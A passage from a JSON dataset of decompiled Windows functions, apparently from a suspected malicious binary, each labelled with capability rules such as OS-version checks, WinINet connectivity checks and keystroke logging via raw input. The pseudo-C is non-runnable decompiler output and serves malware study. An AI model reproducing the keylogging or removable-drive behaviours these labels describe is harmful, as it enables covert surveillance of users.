var_4h;\n                }\n                if (var_8h != 0) {\n                    return var_8h;\n                }\n            }\n        } while (piVar3[5] != 0);\n        if (var_8h != 0) {\n            return var_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 1573
    },
    "0040d4a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040d4a0(void)\n\n{\n    int32_t *arg_8h;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (unaff_EDI == 0) {\n        return 0xffffff9a;\n    }\n    arg_8h = *(unaff_EDI + 0x7c);\n    if (arg_8h == NULL) {\n        return 0xffffff9a;\n    }\n    if ((arg_8h[0x17] == 0) && (arg_8h[0x14] != arg_8h[0x15])) {\n        var_4h = 0xffffff97;\n    }\n    if (*arg_8h != 0) {\n        fcn.0042d696(*arg_8h);\n        *arg_8h = 0;\n    }\n    *arg_8h = 0;\n    if (arg_8h[0x10] != 0) {\n        fcn.0040be50();\n    }\n    arg_8h[0x10] = 0;\n    fcn.0042d696(arg_8h);\n    *(unaff_EDI + 0x7c) = 0;\n    return var_4h;\n}\n",
        "token_count": 290
    },
    "0040e200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040e200(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    int32_t **unaff_ESI;\n    \n    if (unaff_ESI[1] != 0xffffffff) {\n        fcn.0040d4a0();\n    }\n    arg_8h = *unaff_ESI;\n    unaff_ESI[1] = 0xffffffff;\n    if (arg_8h != NULL) {\n        if (arg_8h[0x1f] != 0) {\n            fcn.0040d4a0();\n        }\n        iVar1 = *arg_8h;\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x10) != '\\0') {\n                (**0x4573b8)(*(iVar1 + 4));\n            }\n            fcn.0042d62b(iVar1);\n        }\n        fcn.0042d696(arg_8h);\n    }\n    *unaff_ESI = NULL;\n    return;\n}\n",
        "token_count": 233
    },
    "0040f250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f250(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint arg_8h_00;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_01;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_548h;\n    uint var_434h;\n    uint var_32ch;\n    uint var_224h;\n    uint var_11ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x442b98;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_01 = 0;\n    var_4h = 0;\n    uVar1 = (**0x45757c)(0, 9999999, var_14h);\n    uVar1 = (**0x457504)(uVar1);\n    (**0x457374)(&var_32ch, \"%s\\\\*\");\n    iVar2 = (**0x4575e0)(&var_32ch, &var_574h);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x457550)(&var_548h, 0x44eba0);\n            if (iVar3 != 0) {\n                iVar3 = (**0x457550)(&var_548h, 0x44eba4);\n                if (iVar3 != 0) {\n                    (**0x457374)(&var_434h, \"%s\\\\%s\");\n                    fcn.00434d30(&var_11ch, 0, 0x104);\n                    (**0x457520)(&var_11ch, *0x457098);\n                    puVar4 = fcn.0042d6d0(0x1a);\n                    *puVar4 = 0;\n                    arg_8h_00 = (**0x45758c)();\n                    fcn.0042f3d4(arg_8h_00);\n                    iVar3 = 0x1a;\n                    do {\n                        iVar5 = fcn.0042f3e6();\n                        (**0x457374)(puVar4, 0x44fa74, puVar4, iVar5 % 10);\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                    puVar4[0x1a] = 0;\n                    (**0x457520)(&var_11ch, puVar4);\n                    (**0x4573c8)(&var_434h, &var_11ch, 1);\n                    fcn.0040edb0(uVar1);\n                    (**0x457424)(&var_11ch);\n                }\n            }\n            iVar3 = (**0x457438)(iVar2, &var_574h);\n        } while (iVar3 != 0);\n        (**0x4573a8)(iVar2);\n        fcn.00434d30(&var_224h, 0, 0x104);\n        (**0x457520)(&var_224h, *0x45728c);\n        uVar1 = (**0x457418)(uVar1);\n        if (*0x4572ec == NULL) {\n            *0x457814 = 0x10000;\n        }\n        else if (**0x4572ec == 2) {\n            *0x457814 = fcn.0042bf30(&var_224h, uVar1, 3);\n        }\n        else {\n            *0x457814 = 0x80000;\n        }\n    }\n    if (0xf < arg_1ch) {\n        fcn.0042d62b(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(arg_8h_01);\n    return;\n}\n",
        "token_count": 950
    },
    "0040fe40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_8h_00;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_30h = 0;\n    iVar1 = (**0x457570)();\n    if ((((iVar1 == 0) && (iVar1 = (**0x4574e8)(),  iVar1 == 0x7a)) && (iVar1 = fcn.0042d6d0(var_30h),  iVar1 != 0)) &&\n       (iVar2 = (**0x457570)(),  iVar2 != 0)) {\n        var_34h = 0;\n        uVar3 = (**0x45759c)(0x2000e, &var_34h);\n        iVar2 = (**0x457430)(uVar3);\n        if (iVar2 != 0) {\n            var_38h = 0;\n            iVar2 = (**0x45749c)(var_34h, 2, &var_38h);\n            if (iVar2 != 0) {\n                var_2ch = 0;\n                var_28h = 0;\n                var_24h = 0;\n                var_20h = 0;\n                var_1ch = 0;\n                var_40h = 0;\n                var_44h = 0x14;\n                var_3ch = 0;\n                var_18h = 0x120089;\n                var_14h = 0x120116;\n                var_10h = 0x1200a0;\n                var_ch = 0x1f01ff;\n                (**0x457548)(&arg_8h, &var_18h);\n                (**0x4573c0)(iVar1, var_38h, arg_8h, &var_18h, &var_2ch, &var_44h, &var_40h, &var_3ch);\n                (**0x4573b8)(var_38h);\n            }\n            (**0x4573b8)(var_34h);\n        }\n        fcn.0042d696(iVar1);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 649
    },
    "004106f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Removing unreachable block (ram,0x00411026)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004106f0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_ch_00;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint arg_18h_00;\n    int32_t *extraout_EDX;\n    int32_t *arg_ch_01;\n    int32_t *in_FS_OFFSET;\n    uint var_1964h;\n    uint var_1960h;\n    uint var_195ch;\n    uint var_1958h;\n    uint var_1954h;\n    uint var_1950h;\n    uint var_194ch;\n    uint var_1948h;\n    uint var_1944h;\n    uint var_1934h;\n    uint32_t var_1930h;\n    uint var_1928h;\n    uint var_1918h;\n    uint32_t var_1914h;\n    uint32_t var_190ch;\n    uint var_18fch;\n    uint32_t var_18f8h;\n    uint var_18f0h;\n    uint var_1508h;\n    uint var_1120h;\n    uint var_d38h;\n    uint var_950h;\n    uint var_568h;\n    uint var_460h;\n    uint var_3f8h;\n    uint uStackY412;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x443831;\n    var_ch = *in_FS_OFFSET;\n    fcn.0043c480();\n    *in_FS_OFFSET = &fcn.004106f0::var_ch;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    arg_ch_00 = fcn.0042c910();\n    fcn.00434d30();\n    iVar3 = (**0x457500)();\n    fcn.00423df0(\"%APPDATA%\", &fcn.004106f0::var_d38h & (iVar3 < 0) - 1);\n    (**0x4575cc)();\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    (**0x45744c)();\n    puVar4 = &fcn.004106f0::var_568h;\n    var_18f8h = 0xf;\n    var_18fch = 0;\n    var_190ch = var_190ch & 0xffffff00;\n    do {\n        cVar2 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar2 != '\\0');\n    fcn.004090e0(&fcn.004106f0::var_568h, puVar4 - (&fcn.004106f0::var_568h + 1));\n    var_4h = 0;\n    uVar5 = fcn.00409750(&fcn.004106f0::var_190ch);\n    var_4h._0_1_ = 1;\n    fcn.00414b90(uVar5);\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    if (0xf < var_1914h) {\n        fcn.0042d62b();\n    }\n    if (0xf < var_1930h) {\n        fcn.0042d62b();\n    }\n    var_4h = 0xffffffff;\n    if (0xf < var_18f8h) {\n        fcn.0042d62b();\n    }\n    var_18f8h = 0xf;\n    var_18fch = 0;\n    var_190ch = var_190ch & 0xffffff00;\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    fcn.00434d30();\n    (**0x457500)();\n    iVar3 = (**0x4573a0)();\n    if (iVar3 != 0) {\n        (**0x457498)();\n        *((iVar3 - &fcn.004106f0::var_3f8h) + 0x457830) = 0;\n        (**0x457374)();\n    }\n    (**0x4575cc)();\n    iVar3 = (**0x457490)();\n    uVar5 = 0x44ec98;\n    iVar6 = (**0x457490)();\n    (**0x457490)();\n    if (iVar6 == 0 && iVar3 == 0) {\n        fcn.00410690(&fcn.004106f0::var_3f8h, arg_ch_00, arg_18h, arg_ch, arg_18h_00);\n    }\n    else {\n        (**0x4574b4)();\n        puVar4 = &fcn.004106f0::var_460h;\n        while (var_460h != '\\0') {\n            iVar3 = (**0x4573f8)();\n            if ((iVar6 == 0) || (iVar3 != 2)) {\n                (**0x4575cc)();\n                iVar3 = (**0x4573a0)();\n                if (iVar3 != 0) {\n                    (**0x457498)();\n                    *((iVar3 - &fcn.004106f0::var_950h) + 0x457830) = 0;\n                    uStackY412 = 0x410ed2;\n                    (**0x457374)();\n                }\n            }\n            else {\n                (**0x4575cc)();\n                fcn.00423df0(\"%DRIVE_REMOVABLE%\", puVar4);\n            }\n            (**0x4575cc)();\n            uStackY412 = 0x410f19;\n            fcn.00410690(&fcn.004106f0::var_950h, arg_ch_00, arg_18h, arg_ch, arg_18h_00);\n            iVar3 = (**0x457418)();\n            pcVar1 = puVar4 + iVar3 + 1;\n            puVar4 = puVar4 + iVar3 + 1;\n            var_460h._0_1_ = *pcVar1;\n        }\n    }\n    if (arg_ch_00 == NULL) {\n        arg_ch_01 = NULL;\n        *0x457814 = 0x10000;\n    }\n    else if (*arg_ch_00 == 2) {\n        iVar3 = arg_ch_00[1];\n        if (*(iVar3 + 0x2c) == '\\0') {\n            fcn.0042c850();\n        }\n        *0x457814 = (-(*(iVar3 + 0x20) != 0) & 0xfffe0000) + 0x20000;\n        *(iVar3 + 0x2c) = 1;\n        arg_ch_01 = *(iVar3 + 0x18);\n    }\n    else {\n        *0x457814 = 0x80000;\n        arg_ch_01 = extraout_EDX;\n    }\n    if (extraout_EDX == NULL) {\n        *0x457814 = 0x10000;\n    }\n    else if (*extraout_EDX == 2) {\n        *0x457814 = fcn.0042bf30(&fcn.004106f0::var_1508h, arg_ch_01, 3);\n    }\n    else {\n        *0x457814 = 0x80000;\n    }\n    if (arg_ch_00 == NULL) {\n        *0x457814 = 0x10000;\n    }\n    else {\n        if (*arg_ch_00 == 1) {\n            iVar3 = arg_ch_00[1];\n            *0x4576b0 = fcn.0040e200();\n            if (iVar3 != 0) {\n                fcn.0040e310();\n            }\n        }\n        else {\n            if (*arg_ch_00 != 2) {\n                *0x457814 = 0x80000;\n                goto code_r0x00411082;\n            }\n            iVar3 = arg_ch_00[1];\n            *0x457814 = fcn.0042b820();\n            if (iVar3 != 0) {\n                fcn.0042c9d0();\n            }\n        }\n        fcn.0042d62b();\n    }\ncode_r0x00411082:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar5);\n    return;\n}\n",
        "token_count": 2494
    },
    "00412220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00412220(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint arg_44h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint *puVar3;\n    char *arg_8h;\n    char *pcVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint *var_ch_2;\n    uint var_1ch_3;\n    uint32_t var_20h;\n    uint var_28h;\n    uint32_t var_3ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint noname_2_00;\n    uint noname_3_00;\n    uint32_t in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint arg_28h;\n    uint arg_2ch;\n    uint in_stack_ffffff64;\n    uint noname_11_00;\n    uint noname_12_00;\n    uint noname_13_00;\n    uint32_t in_stack_ffffff74;\n    uint32_t arg_40h;\n    uint in_stack_ffffff7c;\n    uint var_54h_2;\n    uint var_50h_2;\n    char *var_4ch_2;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_5ch;\n    uint *var_2ch_2;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1ch_2;\n    uint32_t var_18h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h_2;\n    \n    arg_ch = noname_15;\n    uStack12 = 0x4422d8;\n    var_ch_3 = *in_FS_OFFSET;\n    var_10h_2 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_3;\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    var_4h_2._0_1_ = 2;\n    var_4h_2._1_3_ = 0;\n    var_50h_2 = 0;\n    noname_13_00 = 0;\n    noname_12_00 = 0x44c726;\n    var_4ch_2 = NULL;\n    arg_40h = in_stack_ffffff74 & 0xffffff00;\n    fcn.004090e0(0x44c726, 0);\n    noname_11_00 = 1;\n    noname_3_00 = 0xffffffff;\n    var_4h_2._0_1_ = 3;\n    noname_2_00 = 0;\n    puVar3 = &var_28h;\n    arg_2ch = 0xf;\n    arg_28h = 0;\n    in_stack_ffffff4c = in_stack_ffffff4c & 0xffffff00;\n    fcn.004092e0(puVar3, 0, 0xffffffff);\n    var_4h_2._0_1_ = 2;\n    fcn.004113d0(&var_48h, puVar3, noname_2_00, noname_3_00, in_stack_ffffff4c, in_stack_ffffff50, in_stack_ffffff54, \n                 in_stack_ffffff58, arg_28h, arg_2ch, in_stack_ffffff64, noname_11_00, noname_12_00, noname_13_00, \n                 arg_40h);\n    var_4h_2._0_1_ = 4;\n    fcn.00408ff0();\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 2);\n    if (0xf < var_5ch) {\n        fcn.0042d62b();\n    }\n    var_5ch = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    iVar2 = (**0x457550)();\n    if (iVar2 != 0) {\n        puVar3 = var_ch_2;\n        if (var_20h < 0x10) {\n            puVar3 = &var_ch_2;\n        }\n        iVar2 = fcn.004149c0(&var_2ch_2, puVar3, var_1ch_3);\n        arg_8h = var_4ch_2;\n        if (iVar2 != -1) {\n            fcn.004094e0(0, iVar2 + var_8h);\n            puVar3 = var_2ch_2;\n            if (var_18h_2 < 0x10) {\n                puVar3 = &var_2ch_2;\n            }\n            arg_8h = fcn.0042e17e(puVar3, arg_ch, &var_50h_2);\n        }\n        iVar2 = (**0x457418)();\n        if (0 < iVar2) {\n            pcVar4 = arg_8h;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            iVar2 = pcVar4 - (arg_8h + 1);\n            goto code_r0x00412384;\n        }\n    }\n    iVar2 = 5;\n    arg_8h = \"ERROR\";\ncode_r0x00412384:\n    fcn.004090e0(arg_8h, iVar2);\n    var_1ch_2 = 0;\n    puVar3 = var_2ch_2;\n    if (var_18h_2 < 0x10) {\n        puVar3 = &var_2ch_2;\n    }\n    *puVar3 = 0;\n    if (0xf < var_18h_2) {\n        fcn.0042d62b();\n    }\n    var_18h_2 = 0xf;\n    var_1ch_2 = 0;\n    var_2ch_2 = var_2ch_2 & 0xffffff00;\n    if (0xf < var_20h) {\n        fcn.0042d62b();\n    }\n    var_20h = 0xf;\n    var_1ch_3 = 0;\n    var_ch_2 = var_ch_2 & 0xffffff00;\n    if (0xf < var_3ch) {\n        fcn.0042d62b();\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0042d636(in_stack_ffffff7c);\n    return;\n}\n",
        "token_count": 1972
    },
    "00412640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412640(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint unaff_EDI;\n    uint arg_8h_00;\n    uint var_13ch;\n    uint var_138h;\n    uint var_10h;\n    uint var_4h;\n    \n    if (*0x4572dc == NULL) {\n        *0x4576b0 = 0x10000;\n    }\n    else if (**0x4572dc == 1) {\n        *0x4576b0 = fcn.0040dcc0(in_ECX);\n    }\n    else {\n        *0x4576b0 = 0x80000;\n    }\n    arg_8h_00 = var_10h;\n    uVar1 = (**0x45757c)(0);\n    uVar1 = (**0x457504)(uVar1);\n    if (arg_8h == 0) {\n        if (*0x4572dc == NULL) {\n            *0x4576b0 = 0x10000;\n        }\n        else if (**0x4572dc == 1) {\n            *0x4576b0 = fcn.0040dda0(0, uVar1, var_10h, 3);\n        }\n        else {\n            *0x4576b0 = 0x80000;\n        }\n    }\n    else {\n        fcn.0040e360(0, unaff_EDI);\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 353
    },
    "00412720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412720(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t *in_FS_OFFSET;\n    uint uStack00000008;\n    uint32_t uStack0000000c;\n    uint uStack00000024;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00001f70;\n    uint arg_8h_00;\n    uint noname_1;\n    uint noname_2;\n    uint32_t in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint arg_24h;\n    uint arg_28h;\n    uint in_stack_ffffff94;\n    uchar *arg_30h;\n    uchar *arg_34h;\n    \n    fcn.0043c480();\n    *in_FS_OFFSET = &stack0x00001fb8;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    uStack0000000c = 0xffffffff;\n    uStack00000008 = fcn.0042cbeb();\n    fcn.0042cbeb();\n    iVar2 = (**0x4573fc)();\n    if (iVar2 == 0) {\n        (**0x457520)();\n        (**0x457520)();\n    }\n    else {\n        (**0x457374)();\n        (**0x457520)();\n        (**0x457520)();\n    }\n    (**0x457520)();\n    fcn.004220c0();\n    fcn.0040e6f0();\n    uVar3 = fcn.0042e323();\n    arg_34h = &stack0x0000042c;\n    arg_30h = &stack0x00000044;\n    noname_2 = 0xffffffff;\n    noname_1 = 0;\n    arg_28h = 0xf;\n    arg_24h = 0;\n    arg_8h_00 = 0x455304;\n    in_stack_ffffff7c = in_stack_ffffff7c & 0xffffff00;\n    fcn.004092e0(0x455304, 0, 0xffffffff);\n    uVar3 = fcn.00417780(arg_8h_00, noname_1, noname_2, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, \n                         in_stack_ffffff88, arg_24h, arg_28h, in_stack_ffffff94, arg_30h, arg_34h, uVar3);\n    (**0x457520)();\n    if (0xf < in_stack_00000028) {\n        fcn.0042d62b();\n    }\n    uStack00000024 = 0;\n    if (0xf < uStack0000000c) {\n        fcn.0042d62b();\n    }\n    uStack0000000c = 0xf;\n    uStack00000008 = 0;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    iVar2 = (**0x457418)();\n    pcVar4 = &stack0x00000be4;\n    if (iVar2 < 5) {\n        iVar2 = (**0x457418)();\n        *0x4576f0 = 1;\n        if (iVar2 != 2) {\n            *0x4576f0 = 0;\n        }\n    }\n    else {\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        fcn.004090e0(&stack0x00000be4, pcVar4 - &stack0x00000be5);\n        fcn.0040e8a0();\n        *0x4576f0 = 1;\n    }\n    *in_FS_OFFSET = in_stack_00001f70;\n    fcn.0042d636(uVar3);\n    return;\n}\n",
        "token_count": 947
    },
    "00412ad0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00412ad0(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint32_t auStackY100312 [4];\n    uint uStackY100296;\n    uint32_t uStackY100292;\n    uint var_118h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442b5e;\n    var_ch = *in_FS_OFFSET;\n    fcn.0043c480();\n    *in_FS_OFFSET = &var_ch;\n    piVar1 = *0x4572ec;\n    fcn.00434d30();\n    (**0x457520)();\n    fcn.0040e6c0();\n    var_4h = 0;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    (**0x45757c)();\n    (**0x457504)();\n    (**0x4574a8)();\n    (**0x457374)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422c70();\n    var_4h = 1;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422c00();\n    var_4h = 2;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.004220c0();\n    var_4h = 3;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    uVar2 = (**0x457494)();\n    fcn.00424340(uVar2);\n    var_4h = 4;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422b40();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x45759c)();\n    (**0x457540)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00423590();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00423760();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422ae0();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x45744c)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422d60(auStackY100312);\n    var_4h = 5;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.00422ed0();\n    var_4h = 6;\n    (**0x457520)();\n    var_4h = 0xffffffff;\n    if (0xf < uStackY100292) {\n        fcn.0042d62b();\n    }\n    uStackY100292 = 0xf;\n    uStackY100296 = 0;\n    auStackY100312[0] = auStackY100312[0] & 0xffffff00;\n    (**0x457520)();\n    (**0x457520)();\n    fcn.004231a0();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x457520)();\n    (**0x45757c)();\n    (**0x457504)();\n    (**0x4574a8)();\n    